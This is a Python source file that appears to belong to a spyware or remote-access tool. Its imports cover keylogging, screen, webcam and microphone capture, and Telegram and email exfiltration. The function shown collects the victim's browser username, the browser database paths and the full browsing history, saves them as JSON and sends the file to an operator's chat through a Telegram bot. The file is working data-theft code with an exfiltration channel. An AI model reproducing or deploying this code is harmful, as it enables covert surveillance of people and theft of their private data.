
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

import telepot

def get(botObj:telepot.Bot, chat_id,path=os.path.join(".","output","browser_history")):
    """
    Get the browser username, path to browser databases, and the entire browser history.

    :param browser_file:  Path to the browser info output file.
    :return:  Nothing
    """

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Scanning")

    dict_obj = bh.get_browserhistory()
    print(dict_obj.keys())

    # Get the browser's username #
    bh_user = bh.get_username()
    # Gets path to database of browser #
    db_path = bh.get_database_paths()
    # Retrieves the user history #
    hist = bh.get_browserhistory()
    # Append the results into one list #
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        # Write the results to output file in json format #
        with Path(path).open('w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    # If error occurs during file operation #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)

    if (botObj is not None):
        with Path(path).open('r', encoding='utf-8') as network_io:
            botObj.sendDocument(chat_id, document=network_io, caption="browser-history")
